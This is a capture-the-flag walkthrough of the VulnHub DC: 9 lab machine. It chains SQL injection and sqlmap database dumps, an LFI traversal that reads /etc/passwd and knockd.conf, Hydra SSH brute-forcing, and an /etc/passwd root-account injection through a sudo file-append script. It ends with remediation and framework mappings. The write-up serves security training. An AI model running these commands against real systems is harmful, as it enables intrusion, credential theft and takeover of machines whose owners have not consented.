# DC: 9 — Knock, Knock, Who's There? Root Is.

DC: 9 is a medium-difficulty machine that chains five distinct techniques into a surprisingly elegant path to root, dude. A SQLi in the search form dumps credentials and a file-append script. LFI via the admin panel reads `/etc/knockd.conf`, revealing the port-knock sequence that unlocks SSH. Hydra cracks the dumped credentials, janitor's hidden sticky-note passwords lead to fredf, and fredf's sudo rule on a Python file-append script lets you write a new root user directly into `/etc/passwd`. Layered, methodical, and rewarding.

| Field | Value |
|---|---|
| **Level** | Medium |
| **Target VM** | DC: 9 |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/dc-9,412/ |
| **Techniques** | SQL injection (search form), sqlmap database dump, MD5 hash cracking, LFI (file parameter), port knocking (7469-8475-9842), Hydra SSH brute-force, lateral movement via hidden password file, sudo file-append /etc/passwd injection |
| **CVEs** | CWE-89 (SQL Injection), CWE-22 (Path Traversal / LFI), CWE-269 (Improper Privilege Management via sudo file-append) |
| **APT Groups** | APT41 (chains SQLi and LFI for lateral access in enterprise web environments); OceanLotus/APT32 (uses credential reuse and lateral movement via compromised low-privilege accounts in Linux environments) |

---

## Attack Summary

```
[nmap: port 80 open, port 22 filtered]
    → [web app: search form → SQLi confirmed]
    → [sqlmap: Staff DB → admin:transorbital1 (MD5)]
    → [sqlmap: users DB → UserDetails table → plaintext creds]
    → [admin login → welcome.php?file= LFI confirmed]
    → [LFI: /etc/knockd.conf → knock sequence 7469 8475 9842]
    → [knock 192.168.1.8 7469 8475 9842 → SSH port 22 opens]
    → [hydra -L users.txt -P pass.txt ssh → janitor:Ilovepeepee]
    → [SSH as janitor → .secrets-for-putin/ → extra passwords]
    → [hydra again → fredf:B4-Tru3-001]
    → [su fredf → sudo -l: /opt/devstuff/test NOPASSWD]
    → [openssl passwd -1 → hash for new root user]
    → [echo 'pavan:<hash>:0:0::/root:/bin/bash' > /tmp/raj]
    → [sudo /opt/devstuff/test /tmp/raj /etc/passwd]
    → [su pavan → uid=0(root)]
    → [cat /root/flag.txt → FLAG]
```

---

## Methodology

1. Network discovery and port scan (port 22 filtered, port 80 open)
2. Web application analysis: search form SQL injection discovery
3. sqlmap: dump Staff and users databases
4. Admin login and LFI discovery in welcome.php
5. LFI to read /etc/knockd.conf: extract port-knock sequence
6. Port knocking to open SSH
7. Hydra SSH brute-force with dumped credentials
8. Lateral movement: janitor → hidden password file → fredf
9. Privilege escalation: fredf sudo /etc/passwd injection via file-append script
10. Root flag capture

---

## Step 1 — Host Discovery and Port Scan

```bash
netdiscover -r 192.168.1.0/24
```

Target identified at `192.168.1.8`.

```bash
nmap -A 192.168.1.8
```

Expected output:

```
PORT   STATE    SERVICE VERSION
22/tcp filtered ssh
80/tcp open     http    Apache httpd 2.4.x
```

Port 22 is filtered — not closed, filtered. This is the hallmark of port knocking: the port exists but is hidden behind a firewall rule that opens it only after receiving packets on specific ports in sequence. Port 80 is our starting point.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — SQL Injection in the Search Form

The web application has a search form. In Burp Suite, capture the search POST request and save it to `raj.txt`. Test for SQL injection by adding a single quote to the search parameter.

Run sqlmap against the saved request:

```bash
sqlmap -r raj.txt --dbs --batch
```

Two databases identified: `Staff` and `users`.

Dump both:

```bash
sqlmap -r raj.txt -D Staff --dump-all --batch
sqlmap -r raj.txt -D users --dump-all --batch
```

**Staff database:** Admin table with an MD5 hash. Crack it:

```bash
echo "md5hash" > admin.hash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt admin.hash
# or: hashcat -m 0 admin.hash /usr/share/wordlists/rockyou.txt
# Result: transorbital1
```

Admin credential: `admin:transorbital1`

**users database:** UserDetails table with multiple usernames and plaintext passwords. Extract them to files:

```bash
# Extract usernames to user.txt
# Extract passwords to pass.txt
```

**Real-world note:** SQL injection in web search forms is one of the most consistently exploited web vulnerabilities in real engagements. APT41 was documented using automated SQLi tooling against healthcare organizations' patient search portals in 2020 to exfiltrate personal data before pivoting to internal systems. The combination of a Staff table (admin hash) and a users table (plaintext passwords) in one dump is a realistic reflection of how developers separate admin accounts from regular user stores — and why both tables must be secured.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1005 — Data from Local System; T1110.002 — Brute Force: Password Cracking

---

## Step 3 — Admin Login and LFI Discovery

Log in to the web application as `admin:transorbital1`. After login, the footer may show a "file does not exist" error — this is the LFI tell. Test path traversal on the `file` parameter:

```
http://192.168.1.8/welcome.php?file=../../../../../../../etc/passwd
```

LFI confirmed. The `file` parameter accepts arbitrary path traversal and includes the referenced file.

Now extract the critical file: the port-knocking daemon configuration:

```
http://192.168.1.8/welcome.php?file=../../../../../../../etc/knockd.conf
```

Expected output (key section):

```
[openSSH]
    sequence    = 7469,8475,9842
    seq_timeout = 5
    command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
    tcpflags    = syn
```

**Port knock sequence: 7469, 8475, 9842**

**Real-world note:** Port knocking is a legitimate security control used to hide services from port scanners. But if the knockd.conf is readable via any file disclosure vulnerability (LFI, directory traversal, SSRF), the entire control is defeated. This is a common finding: the configuration that protects the door is stored in a location readable through the vulnerability that bypasses authentication.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1083 — File and Directory Discovery; T1552.001 — Credentials in Files

---

## Step 4 — Port Knocking and SSH Brute-Force

Send the knock sequence to open SSH:

```bash
# Install knockd if not present: apt install knockd
knock 192.168.1.8 7469 8475 9842

# Verify SSH is now open
nmap -p22 192.168.1.8
# Expected: 22/tcp open ssh
```

Create username and password wordlists from the users database dump. Run Hydra:

```bash
hydra -L user.txt -P pass.txt 192.168.1.8 ssh -t 4
```

Valid credential found: `janitor:Ilovepeepee`

**MITRE ATT&CK:** T1110.001 — Brute Force: Password Guessing; T1021.004 — Remote Services: SSH

---

## Step 5 — SSH as janitor: Hidden Password File

```bash
ssh janitor@192.168.1.8
# Password: Ilovepeepee

ls -la
ls -la .secrets-for-putin/
cat .secrets-for-putin/secrets
```

The hidden directory contains a file with additional passwords (sticky notes style). Add these to `pass.txt` on your attacker machine.

Run Hydra again with the expanded password list against all known usernames:

```bash
hydra -L user.txt -P pass.txt 192.168.1.8 ssh -t 4
```

Additional valid credential found: `fredf:B4-Tru3-001`

**MITRE ATT&CK:** T1083 — File and Directory Discovery; T1552.001 — Credentials in Files; T1021.004 — Remote Services: SSH

---

## Step 6 — Lateral Movement to fredf and Sudo Enumeration

From the janitor shell or SSH directly:

```bash
su fredf
# Password: B4-Tru3-001

sudo -l
```

```
User fredf may run the following commands on dc-9:
    (root) NOPASSWD: /opt/devstuff/test
```

Inspect the script:

```bash
cat /opt/devstuff/test.py
```

```python
#!/usr/bin/python3

import sys

if len(sys.argv) != 3:
    print ("Usage: python test.py read_file write_file")
    sys.exit(1)

else:
    f = open(sys.argv[1], "r")
    output = f.readlines()
    f.close()

    f = open(sys.argv[2], "a")
    f.writelines(output)
    f.close()
```

The script appends the contents of `sys.argv[1]` to `sys.argv[2]` as root. This is equivalent to giving fredf `root` write access to any file on the system. The path to root: craft a malicious /etc/passwd entry and append it.

**MITRE ATT&CK:** T1548.003 — Abuse Elevation Control Mechanism: Sudo

---

## Step 7 — Privilege Escalation via /etc/passwd Injection

Generate a password hash for the new root-level user:

```bash
openssl passwd -1 -salt pavan 123456
# Output: $1$pavan$qv9M3fBmtDPrOTBZflNl81
```

Create the malicious /etc/passwd entry in a temp file:

```bash
echo 'pavan:$1$pavan$qv9M3fBmtDPrOTBZflNl81:0:0::/root:/bin/bash' > /tmp/raj
```

Append it to /etc/passwd using the sudo-allowed script:

```bash
sudo /opt/devstuff/test /tmp/raj /etc/passwd
```

Switch to the new root-level user:

```bash
su pavan
# Password: 123456
id
# uid=0(root) gid=0(root) groups=0(root)
cat /root/flag.txt
```

(☞ﾟヮﾟ)☞ Root via /etc/passwd injection. gg.

**Why does /etc/passwd still work for authentication?** When `/etc/shadow` exists, the second field of `/etc/passwd` is typically `x`, indicating the password hash is in shadow. But if we place a valid hash directly in `/etc/passwd`, the system will use it: the `x` convention is a signal, not a lock. Writing a valid crypt hash into the passwd field bypasses shadow entirely.

**MITRE ATT&CK:** T1548.003 — Abuse Elevation Control Mechanism: Sudo; T1136.001 — Create Account: Local Account

---

## Step 8 — Root Flag

```bash
cat /root/flag.txt
```

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked/Used |
|---|---|---|---|
| Admin MD5 hash | (hash from Staff.Admin) | sqlmap dump of Staff database | hashcat/john → admin:transorbital1 |
| Plaintext user credentials | (multiple: janitor:Ilovepeepee, etc.) | sqlmap dump of users.UserDetails | Hydra SSH brute-force |
| Additional passwords | (sticky note passwords) | `/home/janitor/.secrets-for-putin/` | Hydra round 2 → fredf:B4-Tru3-001 |
| Port knock sequence | 7469, 8475, 9842 | LFI read of `/etc/knockd.conf` | Port knocking to open SSH |
| Root flag | (contents of `/root/flag.txt`) | `/root/flag.txt` | Read as root via /etc/passwd injection |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | SQLi in search form cascaded to full DB compromise and LFI | APT41 uses SQLi in web search portals at enterprise scale; the chain (SQLi → credentials → LFI → port knock config) is realistic and documented | Parameterize ALL database queries; use WAF with SQLi protection; separate admin and user databases |
| 2 | LFI exposed knockd.conf, defeating port knocking | Security control configuration stored in a location readable via LFI defeats the control entirely | Never store sensitive configuration in web-accessible paths; apply defense-in-depth (port knocking + key-based SSH + fail2ban) |
| 3 | Plaintext passwords in users database | Storing plaintext passwords is CWE-312 (Cleartext Storage); real databases store only salted hashes | Use bcrypt/scrypt/argon2 for password hashing; never store plaintext credentials |
| 4 | Hidden .secrets-for-putin directory with extra passwords | "Hidden" dot directories are not secure; ls -la reveals them instantly | Credentials must be in a secrets management system, never in filesystem directories regardless of visibility |
| 5 | Sudo file-append script = root write access to any file | A sudo rule allowing arbitrary file writes is equivalent to full root access; any file can be overwritten including /etc/passwd, /etc/sudoers, cron jobs | Never allow sudo rules that permit arbitrary file writes; audit all sudoers NOPASSWD entries |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Credential Access | Credential Access | Brute Force: Password Cracking | T1110.002 |
| Credential Access | Credential Access | Credentials in Files | T1552.001 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Discovery | Discovery | File and Directory Discovery | T1083 |
| Lateral Movement | Lateral Movement | Remote Services: SSH | T1021.004 |
| Lateral Movement | Lateral Movement | Use Alternate Authentication Material | T1550 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control Mechanism: Sudo | T1548.003 |
| Privilege Escalation | Privilege Escalation | Create Account: Local Account | T1136.001 |

---

## Remediation and Containment

### Technical Fixes

1. **Parameterize all database queries** — the search form must use prepared statements; deploy WAF rules for SQLi patterns
2. **Store knockd.conf outside the web root** — move sensitive configuration to `/etc/` with `root:root 600` permissions; never place it where LFI can reach it
3. **Hash passwords with bcrypt/argon2** in the users database — never store plaintext; rotate all exposed credentials immediately
4. **Remove the sudo rule for `/opt/devstuff/test`** — no sudo rule should allow arbitrary file writes; fredf has no legitimate need for this capability
5. **Implement key-based SSH only** — disable password authentication: `PasswordAuthentication no` in sshd_config; combine with fail2ban and port knocking for defense-in-depth
6. **Audit all home directories** for hidden files containing credentials: `find /home -name ".*" -type f 2>/dev/null`

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Audit web application input validation; inventory all sudo rules; audit all home directory contents |
| Protect | Access Control | Remove file-append sudo rule; enforce SSH key-only authentication; apply least privilege |
| Protect | Data Security | Hash all passwords with bcrypt/argon2; remove plaintext credentials from database; move knockd.conf |
| Detect | Anomalies and Events | Alert on /etc/passwd modification; monitor SQLi indicators in web logs; detect unexpected SSH logins |
| Respond | Response Planning | Rotate all exposed credentials; remove injected /etc/passwd entries; patch SQLi; fix sudo rules |
| Recover | Recovery Planning | Restore clean /etc/passwd and web application configuration; re-audit all accounts and sudo rules |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| SI-10 | Information Input Validation | Parameterized queries for search form; WAF SQLi protection |
| IA-5 | Authenticator Management | bcrypt/argon2 for password hashing; rotate all exposed credentials |
| AC-6 | Least Privilege | Remove file-append sudo; restrict SSH to key-based only |
| SC-28 | Protection of Information at Rest | No plaintext passwords in database; encrypt sensitive configuration files |
| AU-12 | Audit Record Generation | Alert on /etc/passwd and /etc/shadow modifications; log all sudo executions |

### CISA KEV

The combination of SQL injection (CWE-89) and LFI (CWE-22) in web applications is addressed in multiple CISA advisories (AA22-074A, AA21-008A). CISA specifically calls out the risk of credential disclosure via database injection as a first-stage attack enabling full system compromise. Organizations should treat SQLi in any web-facing search or form functionality as CVSS 9.8 severity regardless of the application's internal classification.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Vulnerability and Threat Management (THREAT) | Identify and Remediate Web Application Vulnerabilities (SQLi, LFI) | MIL3 |
| Identity and Access Management (IAM) | Manage Credentials (no plaintext passwords; remove unsafe sudo rules) | MIL3 |
| Asset, Change, and Configuration Management (ASSET) | Manage Configuration Baseline (sudo rules; SSH configuration; sensitive file locations) | MIL2 |

### MITRE D3FEND

- **D3-SQLP** (SQL Query Protection): parameterized queries for all database interactions
- **D3-FPR** (File Path Restriction): restrict file parameter in LFI-vulnerable pages; whitelist allowed paths
- **D3-OAM** (Operating System Administrative Management): restrict sudo rules; monitor /etc/passwd modifications

---

## Final Thoughts

DC: 9 is one of those machines where every technique builds on the last one, and if you skip a step you hit a wall. The port-knocking trick in particular is goated: it looks like a dead end until the LFI gives you the configuration file, and suddenly what seemed like an insurmountable barrier becomes just another door with the keys sitting next to it.

The /etc/passwd injection finale is a classic that every Linux security professional should understand. It is not a CVE — it is a design characteristic of Unix authentication that becomes a vulnerability when combined with an unsafe sudo rule. The lesson: audit your sudoers file with the same intensity you audit your firewall rules.

No cap, the five-technique chain in DC: 9 represents exactly how real-world lateral movement looks when attackers have time and patience.

Thanks guys!! (❍ᴥ❍ʋ)
